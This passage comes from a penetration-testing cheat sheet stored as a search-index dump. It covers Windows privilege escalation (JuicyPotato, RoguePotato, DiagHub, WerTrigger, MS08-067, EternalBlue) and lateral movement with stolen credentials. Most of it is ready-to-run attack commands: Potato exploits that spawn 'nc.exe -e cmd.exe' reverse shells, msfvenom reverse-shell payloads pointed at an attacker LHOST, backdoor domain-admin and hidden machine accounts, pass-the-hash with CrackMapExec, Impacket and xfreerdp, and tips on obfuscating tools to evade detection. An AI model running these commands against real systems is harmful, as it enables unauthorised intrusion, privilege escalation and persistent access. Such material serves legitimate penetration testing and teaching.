</ul> </li> <li> <p>Execute JuicyPotato to run a privileged command.</p> <pre><code>JuicyPotato.exe -l 9999 -p c:\\interpub\\wwwroot\\upload\\nc.exe -a \"IP PORT -e cmd.exe\" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}\nJuicyPotato.exe -l 1340 -p C:\\users\\User\\rev.bat -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}\nJuicyPotato.exe -l 1337 -p c:\\Windows\\System32\\cmd.exe -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} -a \"/c c:\\users\\User\\reverse_shell.exe\"\nTesting {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} 1337\n......\n[+] authresult 0\n{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4};NT AUTHORITY\\SYSTEM\n[+] CreateProcessWithTokenW OK\n</code></pre> </li> </ul>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#rogue-potato-fake-oxid-resolver","title":"Rogue Potato (Fake OXID Resolver)","text":"<ul> <li>Binary available at antonioCoco/RoguePotato</li> </ul> <pre><code># Network redirector / port forwarder to run on your remote machine, must use port 135 as src port\nsocat tcp-listen:135,reuseaddr,fork tcp:10.0.0.3:9999\n# RoguePotato without running RogueOxidResolver locally. You should run the RogueOxidResolver.exe on your remote machine. \n# Use this if you have fw restrictions.\nRoguePotato.exe -r 10.0.0.3 -e \"C:\\windows\\system32\\cmd.exe\"\n# RoguePotato all in one with RogueOxidResolver running locally on port 9999\nRoguePotato.exe -r 10.0.0.3 -e \"C:\\windows\\system32\\cmd.exe\" -l 9999\n#RoguePotato all in one with RogueOxidResolver running locally on port 9999 and specific clsid and custom pipename\nRoguePotato.exe -r 10.0.0.3 -e \"C:\\windows\\system32\\cmd.exe\" -l 9999 -c \"{6d8ff8e1-730d-11d4-bf42-00b0d0118b56}\" -p splintercode\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#efspotato-ms-efsr-efsrpcopenfileraw","title":"EFSPotato (MS-EFSR EfsRpcOpenFileRaw)","text":"<ul> <li>Binary available at https://github.com/zcgonvh/EfsPotato</li> </ul> <pre><code># .NET 4.x\ncsc EfsPotato.cs\ncsc /platform:x86 EfsPotato.cs\n# .NET 2.0/3.5\nC:\\Windows\\Microsoft.Net\\Framework\\V3.5\\csc.exe EfsPotato.cs\nC:\\Windows\\Microsoft.Net\\Framework\\V3.5\\csc.exe /platform:x86 EfsPotato.cs\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#juicypotatong","title":"JuicyPotatoNG","text":"<ul> <li>antonioCoco/JuicyPotatoNG</li> </ul> <pre><code>JuicyPotatoNG.exe -t * -p \"C:\\Windows\\System32\\cmd.exe\" -a \"/c whoami\" &gt; C:\\juicypotatong.txt\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#eop-privileged-file-write","title":"EoP - Privileged File Write","text":""},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#diaghub","title":"DiagHub","text":"<p> Starting with version 1903 and above, DiagHub can no longer be used to load arbitrary DLLs.</p> <p>The Microsoft Diagnostics Hub Standard Collector Service (DiagHub) is a service that collects trace information and is programmatically exposed via DCOM.  This DCOM object can be used to load a DLL into a SYSTEM process, provided that this DLL exists in the <code>C:\\Windows\\System32</code> directory. </p>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#exploit","title":"Exploit","text":"<ol> <li>Create an evil DLL e.g: payload.dll and move it into <code>C:\\Windows\\System32</code></li> <li>Build https://github.com/xct/diaghub</li> <li><code>diaghub.exe c:\\\\ProgramData\\\\ payload.dll</code></li> </ol> <p>The default payload will run <code>C:\\Windows\\System32\\spool\\drivers\\color\\nc.exe -lvp 2000 -e cmd.exe</code></p> <p>Alternative tools: * https://github.com/Accenture/AARO-Bugs/tree/master/CVE-2020-5825/TrigDiag * https://github.com/decoder-it/diaghub_exploit</p>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#usodllloader","title":"UsoDLLLoader","text":"<p> 2020-06-06 Update: this trick no longer works on the latest builds of Windows 10 Insider Preview.</p> <p>An alternative to the DiagHub DLL loading \"exploit\" found by James Forshaw (a.k.a. @tiraniddo)</p> <p>If we found a privileged file write vulnerability in Windows or in some third-party software, we could copy our own version of <code>windowscoredeviceinfo.dll</code> into <code>C:\\Windows\\Sytem32\\</code> and then have it loaded by the USO service to get arbitrary code execution as NT AUTHORITY\\System.</p>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#exploit_1","title":"Exploit","text":"<ol> <li>Build https://github.com/itm4n/UsoDllLoader<ul> <li>Select Release config and x64 architecure.</li> <li>Build solution.<ul> <li>DLL .\\x64\\Release\\WindowsCoreDeviceInfo.dll</li> <li>Loader .\\x64\\Release\\UsoDllLoader.exe.</li> </ul> </li> </ul> </li> <li>Copy <code>WindowsCoreDeviceInfo.dll</code> to <code>C:\\Windows\\System32\\</code></li> <li>Use the loader and wait for the shell or run <code>usoclient StartInteractiveScan</code> and connect to the bind shell on port 1337.</li> </ol>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#wertrigger","title":"WerTrigger","text":"<p>Exploit Privileged File Writes bugs with Windows Problem Reporting</p> <ol> <li>Clone https://github.com/sailay1996/WerTrigger</li> <li>Copy <code>phoneinfo.dll</code> to <code>C:\\Windows\\System32\\</code></li> <li>Place <code>Report.wer</code> file and <code>WerTrigger.exe</code> in a same directory.</li> <li>Then, run <code>WerTrigger.exe</code>.</li> <li>Enjoy a shell as NT AUTHORITY\\SYSTEM</li> </ol>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#wermgr","title":"WerMgr","text":"<p>Exploit Privileged Directory Creation Bugs with Windows Error Reporting</p> <ol> <li>Clone https://github.com/binderlabs/DirCreate2System</li> <li>Create directory <code>C:\\Windows\\System32\\wermgr.exe.local\\</code></li> <li>Grant access to it: <code>cacls C:\\Windows\\System32\\wermgr.exe.local /e /g everyone:f</code></li> <li>Place <code>spawn.dll</code> file and <code>dircreate2system.exe</code> in a same directory and run <code>.\\dircreate2system.exe</code>. </li> <li>Enjoy a shell as NT AUTHORITY\\SYSTEM</li> </ol>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#eop-common-vulnerabilities-and-exposure","title":"EoP - Common Vulnerabilities and Exposure","text":""},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#ms08-067-netapi","title":"MS08-067 (NetAPI)","text":"<p>Check the vulnerability with the following nmap script.</p> <pre><code>nmap -Pn -p445\u200a--open\u200a--max-hostgroup 3\u200a--script smb-vuln-ms08-067 &lt;ip_netblock&gt;\n</code></pre> <p>Metasploit modules to exploit <code>MS08-067 NetAPI</code>.</p> <pre><code>exploit/windows/smb/ms08_067_netapi\n</code></pre> <p>If you can't use Metasploit and only want a reverse shell.</p> <pre><code>https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py\nmsfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -b \"\\x00\\x0a\\x0d\\x5c\\x5f\\x2f\\x2e\\x40\" -f py -v shellcode -a x86 --platform windows\nExample: MS08_067_2018.py 192.168.1.1 1 445 -- for Windows XP SP0/SP1 Universal, port 445\nExample: MS08_067_2018.py 192.168.1.1 2 139 -- for Windows 2000 Universal, port 139 (445 could also be used)\nExample: MS08_067_2018.py 192.168.1.1 3 445 -- for Windows 2003 SP0 Universal\nExample: MS08_067_2018.py 192.168.1.1 4 445 -- for Windows 2003 SP1 English\nExample: MS08_067_2018.py 192.168.1.1 5 445 -- for Windows XP SP3 French (NX)\nExample: MS08_067_2018.py 192.168.1.1 6 445 -- for Windows XP SP3 English (NX)\nExample: MS08_067_2018.py 192.168.1.1 7 445 -- for Windows XP SP3 English (AlwaysOn NX)\npython ms08-067.py 10.0.0.1 6 445\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#ms10-015-kitrap0d-microsoft-windows-nt200020032008xpvista7","title":"MS10-015 (KiTrap0D) - Microsoft Windows NT/2000/2003/2008/XP/Vista/7","text":"<p>'KiTrap0D' User Mode to Ring Escalation (MS10-015)</p> <pre><code>https://www.exploit-db.com/exploits/11199\nMetasploit : exploit/windows/local/ms10_015_kitrap0d\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#ms11-080-afdsys-microsoft-windows-xp2003","title":"MS11-080 (afd.sys) - Microsoft Windows XP/2003","text":"<pre><code>Python: https://www.exploit-db.com/exploits/18176\nMetasploit: exploit/windows/local/ms11_080_afdjoinleaf\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#ms15-051-client-copy-image-microsoft-windows-20032008782012","title":"MS15-051 (Client Copy Image) - Microsoft Windows 2003/2008/7/8/2012","text":"<pre><code>printf(\"[#] usage: ms15-051 command \\n\");\nprintf(\"[#] eg: ms15-051 \\\"whoami /all\\\" \\n\");\n# x32\nhttps://github.com/rootphantomer/exp/raw/master/ms15-051%EF%BC%88%E4%BF%AE%E6%94%B9%E7%89%88%EF%BC%89/ms15-051/ms15-051/Win32/ms15-051.exe\n# x64\nhttps://github.com/rootphantomer/exp/raw/master/ms15-051%EF%BC%88%E4%BF%AE%E6%94%B9%E7%89%88%EF%BC%89/ms15-051/ms15-051/x64/ms15-051.exe\nhttps://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051\nuse exploit/windows/local/ms15_051_client_copy_image\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#ms16-032-microsoft-windows-7-10-2008-2012-r2-x86x64","title":"MS16-032 - Microsoft Windows 7 &lt; 10 / 2008 &lt; 2012 R2 (x86/x64)","text":"<p>Check if the patch is installed : <code>wmic qfe list | findstr \"3139914\"</code></p> <pre><code>Powershell:\nhttps://www.exploit-db.com/exploits/39719/\nhttps://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1\nBinary exe : https://github.com/Meatballs1/ms16-032\nMetasploit : exploit/windows/local/ms16_032_secondary_logon_handle_privesc\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#ms17-010-eternal-blue","title":"MS17-010 (Eternal Blue)","text":"<p>Check the vulnerability with the following nmap script or crackmapexec: <code>crackmapexec smb 10.10.10.10 -u '' -p '' -d domain -M ms17-010</code>.</p> <pre><code>nmap -Pn -p445 --open --max-hostgroup 3 --script smb-vuln-ms17\u2013010 &lt;ip_netblock&gt;\n</code></pre> <p>Metasploit modules to exploit <code>EternalRomance/EternalSynergy/EternalChampion</code>.</p> <pre><code>auxiliary/admin/smb/ms17_010_command          MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution\nauxiliary/scanner/smb/smb_ms17_010            MS17-010 SMB RCE Detection\nexploit/windows/smb/ms17_010_eternalblue      MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption\nexploit/windows/smb/ms17_010_eternalblue_win8 MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+\nexploit/windows/smb/ms17_010_psexec           MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution\n</code></pre> <p>If you can't use Metasploit and only want a reverse shell.</p> <pre><code>git clone https://github.com/helviojunior/MS17-010\n# generate a simple reverse shell to use\nmsfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o revshell.exe\npython2 send_and_execute.py 10.0.0.1 revshell.exe\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#cve-2019-1388","title":"CVE-2019-1388","text":"<p>Exploit : https://packetstormsecurity.com/files/14437/hhupd.exe.html</p> <p>Requirement: - Windows 7  - Windows 10 LTSC 10240</p> <p>Failing on :  - LTSC 2019 - 1709 - 1803</p> <p>Detailed information about the vulnerability : https://www.zerodayinitiative.com/blog/2019/11/19/thanksgiving-treat-easy-as-pie-windows-7-secure-desktop-escalation-of-privilege</p>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#references","title":"References","text":"<ul> <li>icacls - Docs Microsoft</li> <li>Privilege Escalation Windows - Philip Linghammar</li> <li>Windows elevation of privileges - Guifre Ruiz</li> <li>The Open Source Windows Privilege Escalation Cheat Sheet by amAK.xyz and @xxByte</li> <li>Basic Linux Privilege Escalation</li> <li>Windows Privilege Escalation Fundamentals</li> <li>TOP\u201310 ways to boost your privileges in Windows systems - hackmag</li> <li>The SYSTEM Challenge</li> <li>Windows Privilege Escalation Guide - absolomb's security blog</li> <li>Chapter 4 - Windows Post-Exploitation - 2 Nov 2017 - dostoevskylabs</li> <li>Remediation for Microsoft Windows Unquoted Service Path Enumeration Vulnerability - September 18th, 2016 - Robert Russell</li> <li>Pentestlab.blog - WPE-01 - Stored Credentials</li> <li>Pentestlab.blog - WPE-02 - Windows Kernel</li> <li>Pentestlab.blog - WPE-03 - DLL Injection</li> <li>Pentestlab.blog - WPE-04 - Weak Service Permissions</li> <li>Pentestlab.blog - WPE-05 - DLL Hijacking</li> <li>Pentestlab.blog - WPE-06 - Hot Potato</li> <li>Pentestlab.blog - WPE-07 - Group Policy Preferences</li> <li>Pentestlab.blog - WPE-08 - Unquoted Service Path</li> <li>Pentestlab.blog - WPE-09 - Always Install Elevated </li> <li>Pentestlab.blog - WPE-10 - Token Manipulation</li> <li>Pentestlab.blog - WPE-11 - Secondary Logon Handle</li> <li>Pentestlab.blog - WPE-12 - Insecure Registry Permissions</li> <li>Pentestlab.blog - WPE-13 - Intel SYSRET</li> <li>Alternative methods of becoming SYSTEM - 20th November 2017 - Adam Chester @xpn</li> <li>Living Off The Land Binaries and Scripts (and now also Libraries)</li> <li>Common Windows Misconfiguration: Services - 2018-09-23 - @am0nsec</li> <li>Local Privilege Escalation Workshop - Slides.pdf - @sagishahar</li> <li>Abusing Diaghub - xct - March 07, 2019</li> <li>Windows Exploitation Tricks: Exploiting Arbitrary File Writes for Local Elevation of Privilege - James Forshaw, Project Zero - Wednesday, April 18, 2018</li> <li>Weaponizing Privileged File Writes with the USO Service - Part 2/2 - itm4n - August 19, 2019</li> <li>Hacking Trick: Environment Variable $Path Interception y Escaladas de Privilegios para Windows</li> <li>Abusing SeLoadDriverPrivilege for privilege escalation - 14 JUN 2018 - OSCAR MALLO</li> <li>Universal Privilege Escalation and Persistence \u2013 Printer - AUGUST 2, 2021)</li> <li>ABUSING ARBITRARY FILE DELETES TO ESCALATE PRIVILEGE AND OTHER GREAT TRICKS - March 17, 2022 | Simon Zuckerbraun</li> <li>Bypassing AppLocker by abusing HashInfo - 2022-08-19 - Ian</li> <li>Giving JuicyPotato a second chance: JuicyPotatoNG - @decoder_it, @splinter_code</li> <li>IN THE POTATO FAMILY, I WANT THEM ALL - @BlWasp_ </li> <li>Potatoes - Windows Privilege Escalation - Jorge Lajara - November 22, 2020</li> </ul>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Using%20credentials/","title":"Windows - Using credentials","text":""},{"location":"Methodology%20and%20Resources/Windows%20-%20Using%20credentials/#summary","title":"Summary","text":"<ul> <li>Get credentials<ul> <li>Create your credential</li> <li>Guest Credential</li> <li>Retail Credential</li> <li>Sandbox Credential</li> </ul> </li> <li>Crackmapexec</li> <li> <p>Impacket</p> <ul> <li>PSExec</li> <li>WMIExec</li> <li>SMBExec</li> </ul> </li> <li> <p>RDP Remote Desktop Protocol</p> </li> <li>Powershell Remoting Protocol<ul> <li>Powershell Credentials</li> <li>Powershell PSSESSION</li> <li>Powershell Secure String</li> </ul> </li> <li>SSH Protocol</li> <li>WinRM Protocol</li> <li> <p>WMI Protocol</p> </li> <li> <p>Other methods</p> <ul> <li>PsExec - Sysinternal</li> <li>Mount a remote share</li> <li>Run as another user</li> </ul> </li> </ul>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Using%20credentials/#get-credentials","title":"Get credentials","text":""},{"location":"Methodology%20and%20Resources/Windows%20-%20Using%20credentials/#create-your-credential","title":"Create your credential","text":"<pre><code>net user hacker Hcker_12345678* /add /Y\nnet localgroup administrators hacker /add\nnet localgroup \"Remote Desktop Users\" hacker /add # RDP access\nnet localgroup \"Backup Operators\" hacker /add # Full access to files\nnet group \"Domain Admins\" hacker /add /domain\n# enable a domain user account\nnet user hacker /ACTIVE:YES /domain\n# prevent users from changing their password\nnet user username /Passwordchg:No\n# prevent the password to expire\nnet user hacker /Expires:Never\n# create a machine account (not shown in net users)\nnet user /add evilbob$ evilpassword\n# homoglyph A\u0501m\u0456nistrat\u03bfr (different of Administrator)\nA\u0501m\u0456nistrat\u03bfr\n</code></pre> <p>Some info about your user</p> <pre><code>net user /dom\nnet user /domain\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Using%20credentials/#guest-credential","title":"Guest Credential","text":"<p>By default every Windows machine comes with a Guest account, its default password is empty.</p> <pre><code>Username: Guest\nPassword: [EMPTY]\nNT Hash: 31d6cfe0d16ae931b73c59d7e0c089c0\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Using%20credentials/#retail-credential","title":"Retail Credential","text":"<p>Retail Credential @m8urnett on Twitter</p> <p>when you run Windows in retail demo mode, it creates a user named Darrin DeYoung and an admin RetailAdmin</p> <pre><code>Username: RetailAdmin\nPassword: trs10\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Using%20credentials/#sandbox-credential","title":"Sandbox Credential","text":"<p>WDAGUtilityAccount - @never_released on Twitter</p> <p>Starting with Windows 10 version 1709 (Fall Creators Update), it is part of Windows Defender Application Guard</p> <pre><code>\\\\windowssandbox\nUsername: wdagutilityaccount\nPassword: pw123\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Using%20credentials/#crackmapexec","title":"Crackmapexec","text":"<p>Using Porchetta-Industries/CrackMapExec</p> <ul> <li>CrackMapExec supports many protocols     <pre><code>crackmapexec ldap 192.168.1.100 -u Administrator -H \":31d6cfe0d16ae931b73c59d7e0c089c0\" \ncrackmapexec mssql 192.168.1.100 -u Administrator -H \":31d6cfe0d16ae931b73c59d7e0c089c0\"\ncrackmapexec rdp 192.168.1.100 -u Administrator -H \":31d6cfe0d16ae931b73c59d7e0c089c0\" \ncrackmapexec smb 192.168.1.100 -u Administrator -H \":31d6cfe0d16ae931b73c59d7e0c089c0\"\ncrackmapexec winrm 192.168.1.100 -u Administrator -H \":31d6cfe0d16ae931b73c59d7e0c089c0\"\n</code></pre></li> <li>CrackMapExec works with password, NT hash and Kerberos authentication     <pre><code>crackmapexec smb 192.168.1.100 -u Administrator -p \"Password123?\" # Password\ncrackmapexec smb 192.168.1.100 -u Administrator -H \":31d6cfe0d16ae931b73c59d7e0c089c0\" # NT Hash\nexport KRB5CCNAME=/tmp/kerberos/admin.ccache; crackmapexec smb 192.168.1.100 -u admin --use-kcache # Kerberos\n</code></pre></li> </ul>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Using%20credentials/#impacket","title":"Impacket","text":"<p>From fortra/impacket ( renamed to impacket-xxxxx in Kali)   <code>get</code> / <code>put</code> for wmiexec, psexec, smbexec, and dcomexec are changing to <code>lget</code> and <code>lput</code>.    French characters might not be correctly displayed on your output, use <code>-codec ibm850</code> to fix this.   By default, Impacket's scripts are stored in the examples folder: <code>impacket/examples/psexec.py</code>. </p> <p>All Impacket's *exec scripts are not equal, they will target services hosted on multiples ports.  The following table summarize the port used by each scripts.</p> Method Port Used Admin Required psexec.py tcp/445 Yes smbexec.py tcp/445 No atexec.py tcp/445 No dcomexec.py tcp/135, tcp/445, tcp/49751 (DCOM) No wmiexec.py tcp/135, tcp/445, tcp/50911 (Winmgmt) Yes <ul> <li><code>psexec</code>: equivalent of Windows PSEXEC using RemComSvc binary.     <pre><code>psexec.py DOMAIN/username:password@10.10.10.10\n</code></pre></li> <li><code>smbexec</code>: a similar approach to PSEXEC w/o using RemComSvc     <pre><code>smbexec.py DOMAIN/username:password@10.10.10.10\n</code></pre></li> <li><code>atexec</code>: executes a command on the target machine through the Task Scheduler service and returns the output of the executed command.     <pre><code>atexec.py DOMAIN/username:password@10.10.10.10\n</code></pre></li> <li><code>dcomexec</code>: a semi-interactive shell similar to wmiexec.py, but using different DCOM endpoints     <pre><code>dcomexec.py DOMAIN/username:password@10.10.10.10\n</code></pre></li> <li><code>wmiexec</code>: a semi-interactive shell, used through Windows Management Instrumentation. First it uses ports tcp/135 and tcp/445, and ultimately it communicates with the Winmgmt Windows service over dynamically allocated high port such as tcp/50911.     <pre><code>wmiexec.py DOMAIN/username:password@10.10.10.10\nwmiexec.py DOMAIN/username@10.10.10.10 -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0\n</code></pre></li> </ul> <p>To allow Non-RID 500 local admin accounts performing Wmi or PsExec, execute:  <code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /f /d 1</code> To prevent RID 500 from being able to WmiExec or PsExec, execute: <code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v FilterAdministratorToken /t REG_DWORD /f /d 1</code></p>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Using%20credentials/#psexec","title":"PSExec","text":"<p>Instead of uploading <code>psexeccsv</code> service binary, it uploads to <code>ADMIN$</code> a service binary with an arbitrary name. PSExec default kavika13/RemCom binary is 10 years old, you might want to rebuild it and obfuscate it to reduce detections (snovvcrash/RemComObf.sh)</p> <p>Use a custom binary and service name with : <code>psexec.py Administrator:Password123@IP -service-name customservicename -remote-binary-name custombin.exe</code> </p> <p>Also a custom file can be specified with the parameter : <code>-file /tmp/RemComSvcCustom.exe</code>.   You need to update the pipe name to match \"Custom_communication\" in the line 163     </p> <pre><code>162    tid = s.connectTree('IPC$')\n163    fid_main = self.openPipe(s,tid,r'\\RemCom_communicaton',0x12019f)\n</code></pre> <p>Alternatively you can use the fork ThePorgs/impacket.</p>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Using%20credentials/#wmiexec","title":"WMIExec","text":"<p>Use a non default share <code>-share SHARE</code> to write the output to reduce the detection.  By default this command is executed : <code>cmd.exe /Q /c cd 1&gt; \\\\127.0.0.1\\ADMIN$\\__RANDOM 2&gt;&amp;1</code></p>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Using%20credentials/#smbexec","title":"SMBExec","text":"<p>It creates a service with the name <code>BTOBTO</code> (smbexec.py#L59) and transfers commands from the attacker in a bat file in <code>%TEMP/execute.bat</code> (smbexec.py#L56).</p> <pre><code>OUTPUT_FILENAME = '__output'\nBATCH_FILENAME  = 'execute.bat'\nSMBSERVER_DIR   = '__tmp'\nDUMMY_SHARE     = 'TMP'\nSERVICE_NAME    = 'BTOBTO'\n</code></pre> <p>It will create a new service every time we execute a command. It will also generate an Event 7045.</p> <p>By default this command is executed: <code>%COMSPEC% /Q /c echo dir &gt; \\\\127.0.0.1\\C$\\__output 2&gt;&amp;1 &gt; %TEMP%\\execute.bat &amp; %COMSPEC% /Q /c %TEMP%\\execute.bat &amp; del %TEMP%\\execute.bat</code>, where <code>%COMSPEC%</code> points to <code>C:\\WINDOWS\\system32\\cmd.exe</code>.</p> <pre><code>class RemoteShell(cmd.Cmd):\ndef __init__(self, share, rpc, mode, serviceName, shell_type):\ncmd.Cmd.__init__(self)\nself.__share = share\nself.__mode = mode\nself.__output = '\\\\\\\\127.0.0.1\\\\' + self.__share + '\\\\' + OUTPUT_FILENAME\nself.__batchFile = '%TEMP%\\\\' + BATCH_FILENAME\nself.__outputBuffer = b''\nself.__command = ''\nself.__shell = '%COMSPEC% /Q /c '\nself.__shell_type = shell_type\nself.__pwsh = 'powershell.exe -NoP -NoL -sta -NonI -W Hidden -Exec Bypass -Enc '\nself.__serviceName = serviceName\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Using%20credentials/#rdp-remote-desktop-protocol","title":"RDP Remote Desktop Protocol","text":"<p> NOTE: You may need to enable RDP and disable NLA and fix CredSSP errors.</p> <pre><code># Enable RDP\nPS C:\\&gt; reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0x00000000 /f\nPS C:\\&gt; netsh firewall set service remoteadmin enable\nPS C:\\&gt; netsh firewall set service remotedesktop enable\n# Alternative\nC:\\&gt; psexec \\\\machinename reg add \"hklm\\system\\currentcontrolset\\control\\terminal server\" /f /v fDenyTSConnections /t REG_DWORD /d 0\nroot@payload$ crackmapexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f -M rdp -o ACTION=enable\n# Fix CredSSP errors\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /t REG_DWORD /d 0 /f\n# Disable NLA\nPS &gt; (Get-WmiObject -class \"Win32_TSGeneralSetting\" -Namespace root\\cimv2\\terminalservices -ComputerName \"PC01\" -Filter \"TerminalName='RDP-tcp'\").UserAuthenticationRequired\nPS &gt; (Get-WmiObject -class \"Win32_TSGeneralSetting\" -Namespace root\\cimv2\\terminalservices -ComputerName \"PC01\" -Filter \"TerminalName='RDP-tcp'\").SetUserAuthenticationRequired(0)\n</code></pre> <p>Abuse RDP protocol to execute commands remotely with the following commands;</p> <ul> <li><code>rdesktop</code> <pre><code>root@payload$ rdesktop -d DOMAIN -u username -p password 10.10.10.10 -g 70 -r disk:share=/home/user/myshare\nroot@payload$ rdesktop -u username -p password -g 70% -r disk:share=/tmp/myshare 10.10.10.10\n# -g : the screen will take up 70% of your actual screen size\n# -r disk:share : sharing a local folder during a remote desktop session \n</code></pre></li> <li><code>freerdp</code> <pre><code>root@payload$ xfreerdp /v:10.0.0.1 /u:'Username' /p:'Password123!' +clipboard /cert-ignore /size:1366x768 /smart-sizing\nroot@payload$ xfreerdp /v:10.0.0.1 /u:username # password will be asked\n# pass the hash using Restricted Admin, need an admin account not in the \"Remote Desktop Users\" group.\n# pass the hash works for Server 2012 R2 / Win 8.1+\n# require freerdp2-x11 freerdp2-shadow-x11 packages instead of freerdp-x11\nroot@payload$ xfreerdp /v:10.0.0.1 /u:username /d:domain /pth:88a405e17c0aa5debbc9b5679753939d  \n</code></pre></li> <li>SharpRDP <pre><code>PS C:\\&gt; SharpRDP.exe computername=target.domain command=\"C:\\Temp\\file.exe\" username=domain\\user password=password\n</code></pre></li> </ul>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Using%20credentials/#powershell-remoting-protocol","title":"Powershell Remoting Protocol","text":""},{"location":"Methodology%20and%20Resources/Windows%20-%20Using%20credentials/#powershell-credentials","title":"Powershell Credentials","text":"<pre><code>PS&gt; $pass = ConvertTo-SecureString 'supersecurepassword' -AsPlainText -Force\nPS&gt; $cred = New-Object System.Management.Automation.PSCredential ('DOMAIN\\Username', $pass)\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Using%20credentials/#powershell-pssession","title":"Powershell PSSESSION","text":"<ul> <li> <p>Enable PSRemoting on the host     <pre><code>Enable-PSRemoting -Force\nnet start winrm  \n# Add the machine to the trusted hosts\nSet-Item wsman:\\localhost\\client\\trustedhosts *\nSet-Item WSMan:\\localhost\\Client\\TrustedHosts -Value \"10.10.10.10\"\n</code></pre></p> </li> <li> <p>Execute a single command     <pre><code>PS&gt; Invoke-Command -ComputerName DC -Credential $cred -ScriptBlock { whoami }\nPS&gt; Invoke-Command -computername DC01,CLIENT1 -scriptBlock { Get-Service }\nPS&gt; Invoke-Command -computername DC01,CLIENT1 -filePath c:\\Scripts\\Task.ps1\n</code></pre></p> </li> <li> <p>Interact with a PS Session     <pre><code>PS&gt; Enter-PSSession -computerName DC01\n[DC01]: PS&gt;\n# one-to-one execute scripts and commands\nPS&gt; $Session = New-PSSession -ComputerName CLIENT1\nPS&gt; Invoke-Command -Session $Session -scriptBlock { $test = 1 }\nPS&gt; Invoke-Command -Session $Session -scriptBlock { $test }\n1\n</code></pre></p> </li> </ul>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Using%20credentials/#powershell-secure-string","title":"Powershell Secure String","text":"<pre><code>$aesKey = (49, 222, 253, 86, 26, 137, 92, 43, 29, 200, 17, 203, 88, 97, 39, 38, 60, 119, 46, 44, 219, 179, 13, 194, 191, 199, 78, 10, 4, 40, 87, 159)\n$secureObject = ConvertTo-SecureString -String \"76492d11167[SNIP]MwA4AGEAYwA1AGMAZgA=\" -Key $aesKey\n$decrypted = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureObject)\n$decrypted = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($decrypted)\n$decrypted\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Using%20credentials/#winrm-protocol","title":"WinRM Protocol","text":"<p>Requirements: * Port 5985 or 5986 open. * Default endpoint is /wsman</p> <p>If WinRM is disabled on the system you can enable it using: <code>winrm quickconfig</code></p> <p>The easiest way to interact over WinRM on Linux is with Hackplayers/evil-winrm <pre><code>evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] 